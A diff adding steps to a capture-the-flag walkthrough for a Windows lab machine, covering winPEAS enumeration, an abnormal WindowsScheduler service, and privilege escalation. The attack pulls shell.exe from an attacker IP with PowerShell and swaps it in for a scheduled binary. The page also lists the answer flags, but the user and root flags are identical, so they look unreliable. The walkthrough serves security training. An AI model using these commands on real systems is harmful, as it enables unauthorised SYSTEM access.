@@ -348,4 +348,100 @@ Question 1: What is the OS version of this windows machine?
 
 # Question 2
 
+We will go into shell with the meterpreter > Change directory into "Program Files (x86).
 
+<p align="center"> <img src="https://i.imgur.com/q1NoG5T.png" height="90%" width="90%" alt=""/>
+
+We will download winpeas.bat from https://github.com/carlospolop/PEASS-ng/releases/tag/20231112-0a42c550
+
+- Upload winPEAS.bat to shell
+- Go into shell
+- run `winPEAS.bat serviceinfo`
+
+<p align="center"> <img src="https://i.imgur.com/n8meD5n.png" height="90%" width="90%" alt=""/>
+
+Question 2: What is the name of the abnormal service running?
+
+`WindowsScheduler`
+
+#
+
+# Question 3
+
+We first change the directory to `\Program Files (x86)` and see what it contains.
+
+<p align="center"> <img src="https://i.imgur.com/PbJ1xLK.png" height="90%" width="90%" alt=""/>
+
+Change the directory into `SystemScheduler` and see what it contains.
+
+<p align="center"> <img src="https://i.imgur.com/ScOfdkT.png" height="90%" width="90%" alt=""/>
+
+Change the directory into `Events` and see what it contains.
+
+<p align="center"> <img src="https://i.imgur.com/SMcIqkk.png" height="90%" width="90%" alt=""/>
+
+Look into the log file "20198415519.INI_LOG.txt" using the `type` command.
+
+<p align="center"> <img src="https://i.imgur.com/7j6EU3K.png" height="90%" width="90%" alt=""/>
+
+Question 3: What is the name of the binary you're supposed to exploit? 
+
+`message.exe`
+
+#
+
+# Question 4
+
+Redo to put Shell.exe into the target machine's `c:\Program Files (x86)\SystemScheduler`
+
+- Stop the `python3 -m http.server`
+- Redo: `python3 -m http.server 1111`
+- In Shell: change cd into `c:\Program Files (x86)\SystemScheduler`
+- Redo: `powershell -c "Invoke-WebRequest -Uri 'http://10.6.106.187:1111/shell.exe' -OutFile 'c:\Program Files (x86)\SystemScheduler\shell.exe'"`
+
+<p align="center"> <img src="https://i.imgur.com/fMfyzV0.png" height="90%" width="90%" alt=""/>
+
+Successfully put shell.exe into `c:\Program Files (x86)\SystemSchedule`
+
+<p align="center"> <img src="https://i.imgur.com/NnffIW3.png" height="90%" width="90%" alt=""/>
+
+Return shell into meterpreter > `mv Message.exe Message.bak`
+
+<p align="center"> <img src="https://i.imgur.com/F5brO9x.png" height="90%" width="90%" alt=""/>
+
+Mover shell.exe into Message.exe > `mv shell.exe Message.exe`
+
+<p align="center"> <img src="https://i.imgur.com/92zNeQt.png" height="90%" width="90%" alt=""/>
+
+`background` > `run`
+- Successfully gain system privilege.
+
+<p align="center"> <img src="https://i.imgur.com/aeh3Tyu.png" height="90%" width="90%" alt=""/>
+
+We will change directory to jeff's desktop and get the user.txt flag with `cat` command.
+
+<p align="center"> <img src="https://i.imgur.com/P5Q5lGQ.png" height="90%" width="90%" alt=""/>
+
+Question 4: What is the user flag (on Jeffs Desktop)?
+
+`759bd8af507517bcfaede78a21a73e39`
+
+# 
+
+# Qusetion 5
+
+We will change directory to Administrator's desktop and get the root.txt flag with `cat` command.
+
+<p align="center"> <img src="https://i.imgur.com/Ab4ifRQ.png" height="90%" width="90%" alt=""/>
+
+Question 5: What is the root flag?
+
+`759bd8af507517bcfaede78a21a73e39`
+
+#
+
+# Privilege Escalation Without Metasploit Question
+
+Question: Using winPeas, what was the Original Install time? (This is date and time)
+
+`8/3/2019, 10:43:23 AM`
